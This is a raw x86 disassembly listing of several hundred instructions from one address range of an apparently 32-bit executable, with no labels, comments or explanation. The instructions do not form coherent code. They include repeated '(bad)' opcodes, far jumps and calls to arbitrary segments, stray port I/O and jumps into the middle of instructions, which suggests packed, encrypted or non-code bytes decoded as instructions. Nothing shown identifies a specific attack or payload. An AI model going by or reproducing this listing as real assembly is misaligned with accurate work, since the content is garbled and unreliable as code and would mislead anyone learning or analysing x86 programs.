  40b78f:	icebp  
  40b790:	lods   al,BYTE PTR ds:[esi]
  40b791:	jo     0x40b743
  40b793:	arpl   ax,bp
  40b795:	add    DWORD PTR [esi],edx
  40b797:	ret    0xd0a4
  40b79a:	jb     0x40b74b
  40b79c:	pop    es
  40b79d:	call   0x8252:0xc36d6b1b
  40b7a4:	push   0x51
  40b7a6:	sub    esp,DWORD PTR [ecx+0x40f407bd]
  40b7ac:	enter  0xb14b,0x68
  40b7b0:	push   ebp
  40b7b1:	in     al,0xf1
  40b7b3:	test   eax,0x9d8dabe4
  40b7b8:	xchg   esi,eax
  40b7b9:	mov    ds:0x1906b0d1,eax
  40b7be:	test   al,0x5f
  40b7c0:	mov    WORD PTR [eax],gs
  40b7c2:	retf   0xfd2
  40b7c5:	mov    al,ds:0xe70cd02d
  40b7ca:	push   cs
  40b7cb:	in     eax,dx
  40b7cc:	mov    ds:0x3671a725,al
  40b7d1:	jle    0x40b7c6
  40b7d3:	sbb    dh,bh
  40b7d5:	ds mov dl,0x8f
  40b7d8:	inc    edx
  40b7d9:	fdivr  st(7),st
  40b7db:	lds    esi,FWORD PTR [edx+ebp*8-0x36]
  40b7df:	int    0xa9
  40b7e1:	sahf   
  40b7e2:	mov    eax,ds:0xd363bc35
  40b7e7:	fmulp  st(4),st
  40b7e9:	jmp    0xa199:0xef37445a
  40b7f0:	cmp    al,0xc0
  40b7f2:	loopne 0x40b7e0
  40b7f4:	and    DWORD PTR [ecx+ebx*2+0x1708fc20],ecx
  40b7fb:	leave  
  40b7fc:	test   al,0xcd
  40b7fe:	lahf   
  40b7ff:	fcomp  DWORD PTR [ecx-0x6fdc0028]
  40b805:	cmc    
  40b806:	cmp    bh,0x28
  40b809:	shl    edi,1
  40b80b:	push   cs
  40b80c:	and    ebx,DWORD PTR [edi+0x31]
  40b80f:	das    
  40b810:	fild   QWORD PTR ds:0x8949fdbf
  40b816:	dec    esp
  40b817:	dec    ecx
  40b818:	jl     0x40b877
  40b81a:	cmp    DWORD PTR [ebp+0x49],edi
  40b81d:	dec    eax
  40b81e:	push   0x22
  40b820:	cwde   
  40b821:	pop    es
  40b822:	lds    ebx,FWORD PTR [ecx+ebp*8-0x2084a5d]
  40b829:	jae    0x40b8a5
  40b82b:	cmp    DWORD PTR [eax-0x4f],0xffffffca
  40b82f:	cmp    DWORD PTR [esp+edx*1],eax
  40b832:	lods   al,BYTE PTR ds:[esi]
  40b833:	jge    0x40b84e
  40b835:	xchg   ebp,eax
  40b836:	mov    edx,0x232525dc
  40b83b:	ins    DWORD PTR es:[edi],dx
  40b83c:	or     bl,BYTE PTR [edi]
  40b83e:	add    DWORD PTR [esi],edx
  40b840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b841:	mov    DWORD PTR [edi+ecx*2-0x4c],esp
  40b845:	add    edi,DWORD PTR [ecx-0x42]
  40b848:	sub    eax,0xe9d6d956
  40b84d:	loopne 0x40b897
  40b84f:	mov    dl,0x7a
  40b851:	in     eax,dx
  40b852:	addr16 mov ds:0x5139,eax
  40b856:	dec    edi
  40b857:	int    0x8b
  40b859:	scas   eax,DWORD PTR es:[edi]
  40b85a:	mov    ecx,0xae0aadbb
  40b85f:	fistp  WORD PTR [ebp+0x59687bec]
  40b865:	sub    BYTE PTR [edi+esi*2],al
  40b868:	pop    ss
  40b869:	xor    DWORD PTR [ebp-0x5d],edx
  40b86c:	or     dh,ch
  40b86e:	in     eax,dx
  40b86f:	sub    eax,0xb73dd7c1
  40b874:	div    DWORD PTR [ebp-0x41]
  40b877:	sbb    ebp,DWORD PTR [eax+0x1a]
  40b87a:	lods   al,BYTE PTR ds:[esi]
  40b87b:	je     0x40b846
  40b87d:	or     ebp,DWORD PTR [ecx]
  40b87f:	inc    ecx
  40b880:	loope  0x40b8b4
  40b882:	popa   
  40b883:	mov    al,0x10
  40b885:	push   ebp
  40b886:	xchg   edi,eax
  40b887:	outs   dx,BYTE PTR ds:[esi]
  40b888:	sbb    DWORD PTR [esi-0x1f],ecx
  40b88b:	rol    BYTE PTR [eax-0x7341172],cl
  40b891:	pop    ebx
  40b892:	push   edi
  40b893:	in     al,dx
  40b894:	rol    BYTE PTR [esi+eiz*1],0x82
  40b898:	push   es
  40b899:	pop    ebp
  40b89a:	or     DWORD PTR [edx+0x34efdd6a],edi
  40b8a0:	dec    ebp
  40b8a1:	dec    esp
  40b8a2:	pop    edi
  40b8a3:	mov    ah,0x38
  40b8a5:	xlat   BYTE PTR ds:[ebx]
  40b8a6:	add    BYTE PTR [edi+esi*1+0x7900bcdb],bl
  40b8ad:	sbb    al,0xc4
  40b8af:	iret   
  40b8b0:	push   esi
  40b8b1:	repz jle 0x40b910
  40b8b4:	mov    ebp,DWORD PTR [edi-0x19]
  40b8b7:	repnz mov ds,WORD PTR [ebp+edi*2+0x7f4ca944]
  40b8bf:	xchg   esi,eax
  40b8c0:	adc    cl,BYTE PTR [ebx+0xbe2da20]
  40b8c6:	or     cl,cl
  40b8c8:	push   ds
  40b8c9:	jmp    0x40b90e
  40b8cb:	or     bh,BYTE PTR [ebp-0x32]
  40b8ce:	mov    edx,0xb1935e64
  40b8d3:	shr    BYTE PTR [ecx-0xb],0xb6
  40b8d7:	cld    
  40b8d8:	dec    ebx
  40b8d9:	jg     0x40b8c2
  40b8db:	pop    esi
  40b8dc:	xchg   ebp,eax
  40b8dd:	retf   
  40b8de:	jge    0x40b8ec
  40b8e0:	jns    0x40b912
  40b8e2:	xchg   ecx,eax
  40b8e3:	inc    esi
  40b8e4:	push   esp
  40b8e5:	sub    edi,esp
  40b8e7:	push   esi
  40b8e8:	push   eax
  40b8e9:	mov    esp,0x28b93ba0
  40b8ee:	out    0x14,eax
  40b8f0:	sar    ecx,cl
  40b8f2:	or     edi,DWORD PTR ds:0xfbe2e3a2
  40b8f8:	jl     0x40b945
  40b8fa:	xlat   BYTE PTR ds:[ebx]
  40b8fb:	mov    bh,0x94
  40b8fd:	in     al,0x19
  40b8ff:	(bad)  [ebx-0x79]
  40b902:	jmp    0x40b8bf
  40b904:	out    0xf4,al
  40b906:	lods   al,BYTE PTR ds:[esi]
  40b907:	pop    esp
  40b908:	push   ecx
  40b909:	mov    gs,WORD PTR [esi]
  40b90b:	ins    DWORD PTR es:[edi],dx
  40b90c:	pop    ecx
  40b90d:	(bad)  
  40b90e:	cmc    
  40b90f:	(bad)  
  40b910:	mov    ebp,0x37d4ae23
  40b915:	pushf  
  40b916:	and    ch,bh
  40b918:	test   eax,0x1a072ad1
  40b91d:	jg     0x40b987
  40b91f:	shl    DWORD PTR [eax],1
  40b921:	jmp    0x40b8c8
  40b923:	xor    edi,ebx
  40b925:	add    eax,0xd16b49d6
  40b92a:	pop    ecx
  40b92b:	in     al,0xe2
  40b92d:	data16 (bad) 
  40b92f:	xor    DWORD PTR [ecx],esi
  40b931:	xchg   esp,eax
  40b932:	test   BYTE PTR [esi-0x5f701ef9],ch
  40b938:	gs sahf 
  40b93a:	adc    dh,dl
  40b93c:	jno    0x40b917
  40b93e:	fstp   DWORD PTR [ebx]
  40b940:	jmp    0x40b8f7
  40b942:	nop
  40b943:	pop    es
  40b944:	cdq    
  40b945:	lds    esp,FWORD PTR [ecx-0x134890d1]
  40b94b:	mov    dl,0x38
  40b94d:	mov    ebx,0xba26e1f5
  40b952:	rcl    ch,cl
  40b954:	add    eax,0x515651f
  40b959:	fucomi st,st(1)
  40b95b:	sbb    cl,BYTE PTR [ebx-0x27f4878b]
  40b961:	(bad)  [eax-0x4e]
  40b964:	outs   dx,BYTE PTR ds:[esi]
  40b965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b966:	ja     0x40b96a
  40b968:	dec    esi
  40b969:	neg    al
  40b96b:	popf   
  40b96c:	jbe    0x40b9bd
  40b96e:	jp     0x40b92c
  40b970:	sub    esp,ecx
  40b972:	pusha  
  40b973:	pusha  
  40b974:	in     al,0x20
  40b976:	test   DWORD PTR ds:0x48c6019e,edi
  40b97c:	ins    DWORD PTR es:[edi],dx
  40b97d:	adc    edx,DWORD PTR [eax+0x3e8fe648]
  40b983:	ror    DWORD PTR ds:0x3c4c88aa,0x4e
  40b98a:	jbe    0x40b939
  40b98c:	loope  0x40b933
  40b98e:	jbe    0x40b96c
  40b990:	cmp    DWORD PTR [ebp-0x78],ebp
  40b993:	imul   ebx,ebp,0x15
  40b996:	sub    al,dh
  40b998:	mov    ebp,0x6ee7af0a
  40b99d:	cwde   
  40b99e:	xchg   BYTE PTR [edx-0x4c5ccad3],dl
  40b9a4:	imul   esi,DWORD PTR [eax+0x3b839b70],0xfffffff9
  40b9ab:	lock or al,0xdc
  40b9ae:	mov    al,BYTE PTR [esi-0x4acc21b0]
  40b9b4:	mov    bh,0xe9
  40b9b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9b7:	shr    BYTE PTR ds:0x2aa08729,0x18
  40b9be:	mov    al,0x2b
  40b9c0:	mov    edi,0x7186a4f
  40b9c5:	inc    ecx
  40b9c6:	mov    ecx,0xc221df28
  40b9cb:	and    eax,0xb33a48b0
  40b9d0:	std    
  40b9d1:	xchg   edi,eax
  40b9d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d3:	loopne 0x40b961
  40b9d5:	inc    ebp
  40b9d6:	ins    BYTE PTR es:[edi],dx
  40b9d7:	jecxz  0x40b9cc
  40b9d9:	in     eax,0xc4
  40b9db:	mov    dh,0xd7
  40b9dd:	fwait
  40b9de:	adc    al,0xb4
  40b9e0:	lods   eax,DWORD PTR ds:[si]
  40b9e2:	sahf   
  40b9e3:	in     al,dx
  40b9e4:	cmp    ebx,esi
  40b9e6:	lods   eax,DWORD PTR ds:[esi]
  40b9e7:	xchg   BYTE PTR [eax-0x6c0ae4e1],bh
  40b9ed:	rol    DWORD PTR [eax+esi*8+0x75],cl
  40b9f1:	in     al,dx
  40b9f2:	push   ds
  40b9f3:	mov    al,ds:0x24be8854
  40b9f8:	in     eax,dx
  40b9f9:	test   DWORD PTR [esp],edx
  40b9fc:	stc    
  40b9fd:	dec    edx
  40b9fe:	xchg   ecx,eax
  40b9ff:	popf   
  40ba00:	jle    0x40ba7a
  40ba02:	shl    DWORD PTR [eax+0x24],0x6f
  40ba06:	push   es
  40ba07:	xchg   esi,eax
  40ba08:	leave  
  40ba09:	push   ds
  40ba0a:	ja     0x40b995
  40ba0c:	jbe    0x40b995
  40ba0e:	push   es
  40ba0f:	clc    
  40ba10:	adc    DWORD PTR [esi+0x7e],eax
  40ba13:	xchg   esp,eax
  40ba14:	or     ebp,DWORD PTR [ebx]
  40ba16:	pusha  
  40ba17:	push   edx
  40ba18:	adc    al,0xb8
  40ba1a:	leave  
  40ba1b:	add    ecx,ebp
  40ba1d:	jp     0x40b9ba
  40ba1f:	jl     0x40b9e4
  40ba21:	jecxz  0x40b9bb
  40ba23:	gs sbb esp,0x60480c9a
  40ba2a:	pop    si
  40ba2c:	add    edi,DWORD PTR [ebp+ecx*2-0x9]
  40ba30:	stos   DWORD PTR es:[edi],eax
  40ba31:	inc    eax
  40ba32:	sbb    al,0xfe
  40ba34:	into   
  40ba35:	mov    ch,0x8e
  40ba37:	mov    eax,ds:0x753e2a22
  40ba3c:	outs   dx,DWORD PTR ds:[esi]
  40ba3d:	ja     0x40ba0d
  40ba3f:	int3   
  40ba40:	mov    bl,0xee
  40ba42:	and    bl,BYTE PTR [ecx-0x44be6f96]
  40ba48:	outs   dx,DWORD PTR ds:[esi]
  40ba49:	fdiv   st(5),st
  40ba4b:	jmp    DWORD PTR [esi-0xc05eae3]
  40ba51:	dec    edx
  40ba52:	sub    eax,0xf2a93d5e
  40ba57:	jmp    0x40b9e4
  40ba59:	sti    
  40ba5a:	ficomp WORD PTR [esi]
  40ba5c:	or     edi,DWORD PTR [eax]
  40ba5e:	xor    BYTE PTR [edx],0xa3
  40ba61:	jne    0x40b9fa
  40ba63:	dec    esp
  40ba64:	call   0x36a3111e
  40ba69:	loopne 0x40ba21
  40ba6b:	adc    edx,DWORD PTR [eax-0x5f3070da]
  40ba71:	add    edi,esp
  40ba73:	add    al,BYTE PTR [eax]
  40ba75:	loopne 0x40baec
  40ba77:	idiv   DWORD PTR [edx]
  40ba79:	stos   BYTE PTR es:[edi],al
  40ba7a:	(bad)  
  40ba7b:	xlat   BYTE PTR ds:[ebx]
  40ba7c:	xchg   DWORD PTR [edx-0xf],ebp
  40ba7f:	loop   0x40bad3
  40ba81:	enter  0xe8ee,0xb7
  40ba85:	mov    cl,0xc5
  40ba87:	mov    dl,0xe9
  40ba89:	ja     0x40baa8
  40ba8b:	daa    
  40ba8c:	sar    BYTE PTR [edi-0x2],1
  40ba8f:	clc    
  40ba90:	dec    ebp
  40ba91:	jns    0x40ba63
  40ba93:	adc    al,0xeb
  40ba95:	cmp    eax,0x37e9c165
  40ba9a:	xor    DWORD PTR [eax-0x29],0x31
  40ba9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba9f:	sub    BYTE PTR [eax+esi*8],ah
  40baa2:	inc    edx
  40baa3:	cs cmp eax,0x900efe60
  40baa9:	sahf   
  40baaa:	adc    eax,0xd7767b48
  40baaf:	pop    ebp
  40bab0:	sbb    ebp,edx
  40bab2:	jnp    0x40ba67
  40bab4:	gs into 
  40bab6:	inc    edx
  40bab7:	push   ds
  40bab8:	push   es
  40bab9:	add    ch,BYTE PTR [esi-0x5ae0acd2]
  40babf:	jg     0x40bab3
  40bac1:	and    BYTE PTR [edx-0x65],al
  40bac4:	pop    ds
  40bac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bac6:	and    eax,0xbbd0354
  40bacb:	stos   BYTE PTR es:[edi],al
  40bacc:	shl    DWORD PTR [eax],cl
  40bace:	pop    esi
  40bacf:	cmp    edi,ebp
  40bad1:	(bad)  
  40bad2:	retf   0x9617
  40bad5:	push   edx
  40bad6:	dec    ecx
  40bad7:	push   edx
  40bad8:	xchg   edx,eax
  40bad9:	inc    ecx
  40bada:	mov    eax,ds:0x25c8b31b
  40badf:	retf   
  40bae0:	or     eax,0x1a040d4b
  40bae5:	call   0xcfa6:0x34575250
  40baec:	rol    ecx,cl
  40baee:	inc    esi
  40baef:	fisttp QWORD PTR [edi+0x47]
  40baf2:	pop    eax
  40baf3:	pop    esi
  40baf4:	mov    al,0x6b
  40baf6:	dec    eax
  40baf7:	nop
  40baf8:	mov    ch,0x93
  40bafa:	arpl   WORD PTR ds:0x53bbb15f,si
  40bb00:	xchg   BYTE PTR [edi-0x53],bh
  40bb03:	lods   al,BYTE PTR ds:[esi]
  40bb04:	adc    al,bh
  40bb06:	xlat   BYTE PTR ds:[ebx]
  40bb07:	jno    0x40ba8f
  40bb09:	sub    BYTE PTR fs:[ebp-0x60],dl
  40bb0d:	cmp    eax,0x5807eb5c
  40bb12:	cmc    
  40bb13:	inc    edx
  40bb14:	adc    edx,DWORD PTR [ebx+edi*4-0x30c23949]
  40bb1b:	call   0x6e798c47
  40bb20:	icebp  
  40bb21:	mov    ebp,0x4c915248
  40bb26:	jmp    0x723c:0x331386b1
  40bb2d:	jp     0x40bb20
  40bb2f:	stc    
  40bb30:	adc    BYTE PTR [esi],cl
  40bb32:	jno    0x40bad8
  40bb34:	clc    
  40bb35:	(bad)  
  40bb36:	aad    0xf8
  40bb38:	fs inc esi
  40bb3a:	ror    DWORD PTR [edi],cl
  40bb3c:	mov    ecx,0x471fea8d
  40bb41:	add    BYTE PTR [ebp-0x3d916167],ah
  40bb47:	outs   dx,BYTE PTR ds:[esi]
  40bb48:	cmp    esp,edx
  40bb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb4b:	or     al,0x92
  40bb4d:	pop    ss
  40bb4e:	or     ah,BYTE PTR [ebx-0x621c2220]
  40bb54:	je     0x40bb81
  40bb56:	mov    ah,0x3b
  40bb58:	sbb    ebp,ecx
  40bb5a:	cld    
  40bb5b:	(bad)  
  40bb5c:	jns    0x40bb31
  40bb5e:	dec    ebp
  40bb5f:	sti    
  40bb60:	pusha  
  40bb61:	push   eax
  40bb62:	and    DWORD PTR [ebp+eiz*2-0x3ef28195],0xa26caafa
  40bb6d:	fdiv   st(2),st
  40bb6f:	xchg   edx,eax
  40bb70:	sbb    al,0x33
  40bb72:	and    ebx,ecx
  40bb74:	fiadd  DWORD PTR [edi]
  40bb76:	(bad)  
  40bb77:	mov    dl,0x6d
  40bb79:	mov    ecx,0x924f3ae7
  40bb7e:	mov    ds:0x8e097b9d,al
  40bb83:	stc    
  40bb84:	test   bl,0xbc
  40bb87:	pop    eax
  40bb88:	fidivr WORD PTR [esi]
  40bb8a:	rcl    DWORD PTR [edx],cl
  40bb8c:	and    al,0x83
  40bb8e:	shl    cl,1
  40bb90:	push   eax
  40bb91:	es inc esi
  40bb93:	loopne 0x40bb83
  40bb95:	ret    
  40bb96:	pop    ecx
  40bb97:	pop    es
  40bb98:	sub    al,0xce
  40bb9a:	or     edx,DWORD PTR [edx]
  40bb9c:	or     eax,DWORD PTR [edx]
  40bb9e:	int3   
  40bb9f:	xchg   ecx,eax
  40bba0:	mov    al,0x58
  40bba2:	xor    eax,0x6c5782df
  40bba7:	test   DWORD PTR [edx],ebp
  40bba9:	adc    DWORD PTR [ecx+0x5b],ebx
  40bbac:	mov    BYTE PTR [esi-0x28f1fe9e],dh
  40bbb2:	pop    ebp
  40bbb3:	and    ebp,DWORD PTR [ecx-0x45aba5ea]
  40bbb9:	and    BYTE PTR [edx-0x25],cl
  40bbbc:	shl    BYTE PTR ds:0xb6d2eb49,0x18
  40bbc3:	adc    dh,bh
  40bbc5:	call   0x69f2:0x8e29473e
  40bbcc:	add    eax,0xcf4bcaa4
  40bbd1:	or     eax,0xfde22ae2
  40bbd6:	es jmp 0x11928f5b
  40bbdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbdd:	sub    BYTE PTR [ebx+0x19],dh
  40bbe0:	push   eax
  40bbe1:	jns    0x40bc3e
  40bbe3:	aas    
  40bbe4:	or     al,ch
  40bbe6:	sahf   
  40bbe7:	leave  
  40bbe8:	inc    esi
  40bbe9:	cmp    DWORD PTR [eax],eax
  40bbeb:	fst    DWORD PTR [edi]
  40bbed:	leave  
  40bbee:	or     eax,0xb1967b43
  40bbf3:	mov    dl,0x53
  40bbf5:	test   eax,0x2aa406a5
  40bbfa:	repz fstp st(5)
  40bbfd:	jle    0x40bc74
  40bbff:	in     eax,dx
  40bc00:	stos   DWORD PTR es:[edi],eax
  40bc01:	in     eax,0xcc
  40bc03:	in     al,0x68
  40bc05:	adc    eax,0x7007866
  40bc0a:	dec    edx
  40bc0b:	(bad)  
  40bc0c:	pop    ebx
  40bc0d:	mov    ebx,0x96b0c1a5
  40bc12:	push   ebx
  40bc13:	xchg   ecx,eax
  40bc14:	cs dec esi
  40bc16:	ins    BYTE PTR es:[edi],dx
  40bc17:	pop    ebx
  40bc18:	jecxz  0x40bbad
  40bc1a:	dec    edi
  40bc1b:	dec    esi
  40bc1c:	mov    dl,0xea
  40bc1e:	enter  0x9a0c,0x2d
  40bc22:	lods   al,BYTE PTR ds:[esi]
  40bc23:	xchg   edi,eax
  40bc24:	cli    
  40bc25:	icebp  
  40bc26:	push   0xbcfab6ed
  40bc2b:	call   FWORD PTR ds:0x9e6c14ba
  40bc31:	shr    cl,1
  40bc33:	xchg   al,al
  40bc35:	ins    BYTE PTR es:[edi],dx
  40bc36:	popf   
  40bc37:	out    dx,al
  40bc38:	ins    BYTE PTR es:[edi],dx
  40bc39:	pop    ebx
  40bc3a:	jmp    0x740c4a30
  40bc3f:	xchg   ecx,eax
  40bc40:	dec    edx
  40bc41:	call   0xf2ff:0x4e9cbdab
  40bc48:	je     0x40bbd9
  40bc4a:	vpacksswb ymm1,ymm7,ymm0
  40bc4e:	mov    cl,0xe5
  40bc50:	sbb    ebp,DWORD PTR [ebx-0x76]
  40bc53:	or     BYTE PTR [ebx+0x28],cl
  40bc56:	repnz and ah,BYTE PTR ds:0xb2ac9e85
  40bc5d:	shr    BYTE PTR [ecx+0x76be0aaa],1
  40bc63:	mov    al,0xf1
  40bc65:	mov    esp,0xd696a75d
  40bc6a:	stc    
  40bc6b:	sbb    ecx,eax
  40bc6d:	imul   BYTE PTR [ebx-0x79308fd8]
  40bc73:	jle    0x40bcd9
  40bc75:	jmp    0x64fc:0x471b4b2c
  40bc7c:	push   esp
  40bc7d:	add    ah,ch
  40bc7f:	xor    al,bl
  40bc81:	outs   dx,DWORD PTR ds:[esi]
  40bc82:	ds jmp 0xa047:0x94e37bfe
  40bc8a:	aad    0x49
  40bc8c:	push   ecx
  40bc8d:	loop   0x40bcb2
  40bc8f:	cli    
  40bc90:	cmp    al,ch
  40bc92:	cmp    DWORD PTR [ecx-0x7c],edx
  40bc95:	sub    al,0xd1
  40bc97:	in     al,0x23
  40bc99:	lahf   
  40bc9a:	mov    WORD PTR [ebp-0xc],gs
  40bc9d:	cmc    
  40bc9e:	sub    esi,esp
  40bca0:	aaa    
  40bca1:	scas   eax,DWORD PTR es:[edi]
  40bca2:	daa    
  40bca3:	or     ebp,DWORD PTR [ecx+0xd8b9383]
  40bca9:	jle    0x40bc91
  40bcab:	and    DWORD PTR [eax],0xffffffc4
  40bcae:	cld    
  40bcaf:	xchg   esi,eax
  40bcb0:	pop    esp
  40bcb1:	xlat   BYTE PTR ds:[ebx]
  40bcb2:	jle    0x40bcbd
  40bcb4:	push   0x5f861815
  40bcb9:	mov    bl,0x61
  40bcbb:	jg     0x40bd1f
  40bcbd:	add    al,0x53
  40bcbf:	push   edi
  40bcc0:	gs stos BYTE PTR es:[edi],al
  40bcc2:	mov    esi,0x994a661f
  40bcc7:	nop
  40bcc8:	mov    WORD PTR [edx],ss
  40bcca:	xchg   DWORD PTR [ecx-0x10],ebx
  40bccd:	sub    al,0x84
  40bccf:	mov    es,ecx
  40bcd1:	pop    edi
  40bcd2:	adc    DWORD PTR [ebx],ebx
  40bcd4:	call   0x878f:0x8acc51c3
  40bcdb:	rcl    BYTE PTR [ebp+ebp*4-0x43d9738],0xce
  40bce3:	xchg   esi,eax
  40bce4:	dec    edx
  40bce5:	cdq    
  40bce6:	aas    
  40bce7:	(bad)  
  40bce8:	out    0xca,al
  40bcea:	jmp    0x2638449f
  40bcef:	fwait
  40bcf0:	test   eax,0xd5367065
  40bcf5:	xchg   edi,eax
  40bcf6:	imul   edx,DWORD PTR [edi],0x238177c0
  40bcfc:	adc    edi,DWORD PTR [eax+0x70f3668b]
  40bd02:	add    DWORD PTR [ecx],ebx
  40bd04:	das    
  40bd05:	cld    
  40bd06:	and    ch,bh
  40bd08:	mov    ch,0x6c
  40bd0a:	out    0x88,eax
  40bd0c:	cmp    eax,0x2716675
  40bd11:	aad    0x89
  40bd13:	mov    dh,0xb4
  40bd16:	sub    al,0xa5
  40bd18:	inc    ecx
  40bd19:	sub    eax,0xea964676
  40bd1e:	mov    edx,0x57a55626
  40bd23:	loop   0x40bcf9
  40bd25:	inc    eax
  40bd26:	les    edi,FWORD PTR [esi+0x6a197b6c]
  40bd2c:	ret    0xefbf
  40bd2f:	mov    al,0x79
  40bd31:	dec    eax
  40bd32:	mov    dl,0x2e
  40bd34:	aas    
  40bd35:	dec    ebp
  40bd36:	nop
  40bd37:	mov    edx,0x9814aea0
  40bd3c:	xor    ch,BYTE PTR [edx+0x2c]
  40bd3f:	clc    
  40bd40:	ss push ebp
  40bd42:	in     eax,dx
  40bd43:	jnp    0x40bdc0
  40bd45:	push   ebx
  40bd46:	out    dx,eax
  40bd47:	lock mov edx,0x537f93b3
  40bd4d:	and    bh,ah
  40bd4f:	sub    al,0x28
  40bd51:	lea    eax,[eax-0x4f]
  40bd54:	jae    0x40bdd5
  40bd56:	push   cs
  40bd57:	outs   dx,BYTE PTR ds:[esi]
  40bd58:	frndint 
  40bd5a:	mov    ds:0x4a390c4e,eax
  40bd5f:	mov    ah,0xc6
  40bd61:	es inc edx
  40bd63:	rcr    ebp,1
  40bd65:	les    eax,FWORD PTR [eax-0x1e530554]
  40bd6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd6c:	inc    ebx
  40bd6d:	jo     0x40bd66
  40bd6f:	cmc    
  40bd70:	shr    BYTE PTR [edi-0x6ecd4d8a],1
  40bd76:	sbb    eax,0x11b3c2cb
  40bd7b:	out    0x79,al
  40bd7d:	cli    
  40bd7e:	dec    esp
  40bd7f:	mov    DWORD PTR [ebx],ebx
  40bd81:	and    DWORD PTR [edi],0x5db144dc
  40bd87:	scas   eax,DWORD PTR es:[edi]
  40bd88:	les    esp,FWORD PTR [ebp+0xd]
  40bd8b:	dec    DWORD PTR [ebx+0x49]
  40bd8e:	push   eax
  40bd8f:	fmul   QWORD PTR [ebx]
  40bd91:	imul   BYTE PTR [ebp+0x27228c88]
  40bd97:	inc    ebp
  40bd98:	sbb    al,0xdd
  40bd9a:	pop    ecx
  40bd9b:	sub    BYTE PTR [edi+0x153f433e],cl
  40bda1:	daa    
  40bda2:	adc    bh,BYTE PTR [ebx+0x10]
  40bda5:	push   esp
  40bda6:	into   
  40bda7:	mov    dl,0x64
  40bda9:	and    BYTE PTR [eax+eax*1],al
  40bdac:	jp     0x40be05
  40bdae:	test   eax,0x94683cee
  40bdb3:	add    al,0x73
  40bdb5:	cmp    esi,DWORD PTR [ebx]
  40bdb7:	pop    ss
  40bdb8:	(bad)  
  40bdb9:	mov    esi,0xc6f8b1e
  40bdbe:	mov    cl,0x5b
  40bdc0:	sbb    al,0xc4
  40bdc2:	sbb    BYTE PTR [ebx],cl
  40bdc4:	cmp    BYTE PTR [edx-0x6ae0cd97],bh
  40bdca:	mov    esp,0x9587cfd1
  40bdcf:	icebp  
  40bdd0:	mov    al,ds:0x4725cca8
  40bdd5:	sbb    DWORD PTR [ebx-0x60],0xbaecc04e
  40bddc:	or     eax,0xa5a64094
  40bde1:	shr    dh,0x4e
  40bde4:	mov    dl,bh
  40bde6:	aam    0x1f
  40bde8:	jbe    0x40be01
  40bdea:	xchg   ebp,eax
  40bdeb:	lahf   
  40bdec:	cmp    BYTE PTR [ecx+0x67fef17b],ah
  40bdf2:	repz mov ebp,0xf56b6ba5
  40bdf8:	nop
  40bdf9:	xchg   edi,eax
  40bdfa:	adc    esp,DWORD PTR [ebp-0x22]
  40bdfd:	add    DWORD PTR [ecx],ebx
  40bdff:	dec    edi
  40be00:	jmp    0x7a6200f
  40be05:	push   ss
  40be06:	and    esi,esi
  40be08:	mov    ebp,0x8a6036ce
  40be0d:	mov    ah,0xf5
  40be0f:	int3   
  40be10:	jp     0x40bdfe
  40be12:	js     0x40be93
  40be14:	loop   0x40be37
  40be16:	sub    DWORD PTR [eax],esp
  40be18:	jae    0x40be09
  40be1a:	pop    ebp
  40be1b:	loop   0x40bddb
  40be1d:	push   0x6c
  40be1f:	retf   0x89e1
  40be22:	or     al,0x1c
  40be24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be25:	icebp  
  40be26:	in     al,dx
  40be27:	cli    
  40be28:	inc    ecx
  40be29:	push   es
  40be2a:	dec    ecx
  40be2b:	in     eax,dx
  40be2c:	(bad)  
  40be2d:	ror    BYTE PTR [edi+0x1bef4acb],cl
  40be33:	xor    ah,BYTE PTR [esi]
  40be35:	cli    
  40be36:	dec    ebp
  40be37:	test   DWORD PTR [eax+0x6d57505c],0xb4d9b21a
  40be41:	inc    edx
  40be42:	add    al,0xd1
  40be44:	(bad)  
  40be45:	scas   eax,DWORD PTR es:[edi]
  40be46:	cwde   
  40be47:	cmp    al,0xee
  40be49:	mov    eax,0xcab9483b
  40be4e:	dec    ebx
  40be4f:	or     esp,DWORD PTR [eax-0x71c8a8e3]
  40be55:	mov    esp,0x75b2874a
  40be5a:	mov    ecx,0xd690a586
  40be5f:	cmp    DWORD PTR [edx-0x1be2c4ed],eax
  40be65:	in     al,0x28
  40be67:	xor    edi,0xffffffe2
  40be6a:	in     eax,dx
  40be6b:	inc    edi
  40be6c:	mov    eax,DWORD PTR [eax-0xd89d421]
  40be72:	adc    DWORD PTR [edi],ebx
  40be74:	pop    esi
  40be75:	(bad)  
  40be76:	mov    bl,0x76
  40be78:	sub    cl,dl
  40be7a:	das    
  40be7b:	lahf   
  40be7c:	xchg   esi,eax
  40be7d:	aad    0x5d
  40be7f:	mov    cl,0x18
  40be81:	sbb    eax,DWORD PTR [edi+0x6ba5ac12]
  40be87:	out    dx,eax
  40be88:	mov    cl,0x62
  40be8a:	fst    DWORD PTR [ebp-0x1c74086]
  40be90:	(bad)  
  40be91:	push   edx
  40be92:	xchg   ecx,eax
  40be93:	pop    ebp
  40be94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be95:	sub    ebx,ebp
  40be97:	les    esp,FWORD PTR [eax-0x6d]
  40be9a:	push   ebx
  40be9b:	mov    ds,WORD PTR [ebx-0x435357d2]
  40bea1:	rcr    DWORD PTR ds:0x1f56ca05,1
  40bea7:	and    DWORD PTR [ebp-0xc7e9e75],edi
  40bead:	or     eax,DWORD PTR [ebp+0x1b]
  40beb0:	jge    0x40bec8
  40beb2:	(bad)  
  40beb3:	sbb    BYTE PTR [edx+0x5],ch
  40beb6:	xchg   ecx,eax
  40beb7:	fcmovne st,st(6)
  40beb9:	(bad)  
  40beba:	or     al,0x90
  40bebc:	sar    ecx,cl
  40bebe:	jae    0x40befc
  40bec0:	xchg   ebx,eax
  40bec2:	add    BYTE PTR [esi+0x3ab3581b],ah
  40bec8:	popf   
  40bec9:	call   0xceff:0x60dda6ea
  40bed0:	mov    ds:0x5dee4137,eax
  40bed5:	pop    esi
  40bed6:	into   
  40bed7:	(bad)  
